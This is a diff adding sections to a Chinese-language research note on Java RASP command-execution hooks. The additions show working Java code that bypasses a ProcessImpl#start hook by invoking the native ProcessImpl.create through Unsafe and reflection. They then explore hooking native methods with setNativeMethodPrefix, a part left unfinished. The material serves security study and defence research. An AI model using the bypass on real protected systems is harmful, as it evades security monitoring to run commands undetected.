@@ -282,3 +282,157 @@ mv.visitVarInsn(ALOAD, 0);
 super.visitMethodInsn(INVOKESTATIC, "java/lang/ProcessImpl", "hook", "([Ljava/lang/String;)V", false);
 ```
 
+# Bypass
+
+上面的hook点在`ProcessImpl#start`，我们可以通过调用更底层的函数来绕过。
+
+以windows为例，直接调用`ProcessImpl`的native方法`create`
+
+利用`sun.misc.Unsafe#allocateInstance`去实例化`ProcessImpl`
+
+这里讲一下如何获取到命令执行的返回结果
+
+之前调用`Runtime#exec`会返回一个`Process`对象，而`ProcessImpl`是`Process`的实现类
+
+`getInputStream`返回`Process`对象的`stdout_stream`标准输出流，我们获取命令执行的结果大概是这样子的
+
+```java
+Process process = Runtime.getRuntime().exec("whoami");
+
+BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+String line;
+while ((line = reader.readLine()) != null) {
+    System.out.println(line);
+}
+```
+
+由于我们调用的 `create` native方法，无法得到一个完整的`ProcessImpl`对象，无法直接调用`getInputStream`，只能看它构造函数怎么获取命令执行的结果了。
+
+调试可知，经过`create`调用后，stdHandler由原本的`long[]{-1L,-1L,-1L}`变为新的三个值，这三个值分别是标准输入、输出、错误的文件描述符。由`stdout_fd`可获取到命令执行的返回结果。
+
+![image-20230922091403479](./../.gitbook/assets/image-20230922091403479.png)
+
+```java
+import sun.misc.JavaIOFileDescriptorAccess;
+import sun.misc.Unsafe;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class ByPass {
+    public static void main(String[] args) throws Exception {
+        Class<?> clazz = Class.forName("sun.misc.Unsafe");
+        Field field = clazz.getDeclaredField("theUnsafe");
+        field.setAccessible(true);
+        Unsafe unsafe = (Unsafe) field.get(null);
+        Class<?> processImpl = Class.forName("java.lang.ProcessImpl");
+        Process process = (Process) unsafe.allocateInstance(processImpl);
+        Method create = processImpl.getDeclaredMethod("create", String.class, String.class, String.class, long[].class, boolean.class);
+        create.setAccessible(true);
+        long[] stdHandles = new long[]{-1L, -1L, -1L};
+        create.invoke(process, "whoami", null, null, stdHandles, false);
+
+        JavaIOFileDescriptorAccess fdAccess
+            = sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();
+        FileDescriptor stdout_fd = new FileDescriptor();
+        fdAccess.setHandle(stdout_fd, stdHandles[1]);
+        InputStream inputStream = new BufferedInputStream(
+            new FileInputStream(stdout_fd));
+
+        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+
+        String line;
+        while ((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+    }
+}
+```
+
+# Hook Native
+
+那就把hook点改成native方法呗。但native方法不在java层面，不存在方法体，如何用ASM去修改呢?
+
+`Instrumentation`提供了一个方法`setNativeMethodPrefix`，看一下这个方法的描述
+
+> This method modifies the failure handling of native method resolution by allowing retry with a prefix applied to the name. When used with the ClassFileTransformer, it enables native methods to be instrumented.
+>
+> Since native methods cannot be directly instrumented (they have no bytecodes), they must be wrapped with a non-native method which can be instrumented. For example, if we had:
+> ```java
+> native boolean foo(int x);
+> ```
+>
+> We could transform the class file (with the ClassFileTransformer during the initial definition of the class) so that this becomes:
+>
+> ```java
+> boolean foo(int x) {
+> ... record entry to foo ...
+> return wrapped_foo(x);
+> }
+> native boolean wrapped_foo(int x);
+> ```
+>
+> Where foo becomes a wrapper for the actual native method with the appended prefix "wrapped_".
+>
+> The wrapper will allow data to be collected on the native method call, but now the problem becomes linking up the wrapped method with the native implementation. That is, the method wrapped_foo needs to be resolved to the native implementation of foo, which might be:
+> ```java
+> Java_somePackage_someClass_foo(JNIEnv* env, jint x)
+> ```
+>
+> This function allows the prefix to be specified and the proper resolution to occur. Specifically, when the standard resolution fails, the resolution is retried taking the prefix into consideration. There are two ways that resolution occurs, explicit resolution with the JNI function RegisterNatives and the normal automatic resolution. For RegisterNatives, the JVM will attempt this association:
+>
+> ```java
+> method(foo) -> nativeImplementation(foo)
+> ```
+>
+> When this fails, the resolution will be retried with the specified prefix prepended to the method name, yielding the correct resolution:
+>
+> ```java
+> method(wrapped_foo) -> nativeImplementation(foo)
+> ```
+>
+> For automatic resolution, the JVM will attempt:
+>
+> ```java
+> method(wrapped_foo) -> nativeImplementation(wrapped_foo)
+> ```
+>
+> When this fails, the resolution will be retried with the specified prefix deleted from the implementation name, yielding the correct resolution:
+>
+> ```java
+> method(wrapped_foo) -> nativeImplementation(foo)
+> ```
+
+给原本的native方法加上一个前缀，再套一层方法来调用添加前缀的native方法。
+
+这时候需要重新建立java方法和native方法的映射关系。
+
+以openJDK为例，`ProcessImpl#create`和其C实现对应如下：
+
+![image-20230922112813375](./../.gitbook/assets/image-20230922112813375.png)
+
+`https://github.com/openjdk/jdk/blob/master/src/java.base/windows/native/libjava/ProcessImpl_md.c`
+
+![image-20230922112421288](./../.gitbook/assets/image-20230922112421288.png)
+
+native方法的名称格式为`Java_PackageName_ClassName_MethodName`，这个规则称为标准解析(`standard resolution`)
+
+如果给jvm增加一个ClassTransformer并设置native prefix，jvm将进行自动解析(`normal automatic resolution`)
+
+`setNativeMethodPrefix`要在`inst.addTransformer`之后调用，反则会抛出异常`transformer not registered in setNativeMethodPrefix`
+
+要开启native prefix，还得在`MANIFEST.MF`中设置`Can-Set-Native-Method-Prefix: true`
+
+报错了StackOverFlowError。TODO😭
+
+
+
+
+
+
+
+# Native Bypass
+
+之前阿里云CTF看到一个神奇的绕过方法，涉及pwn，暂时研究不了。
+
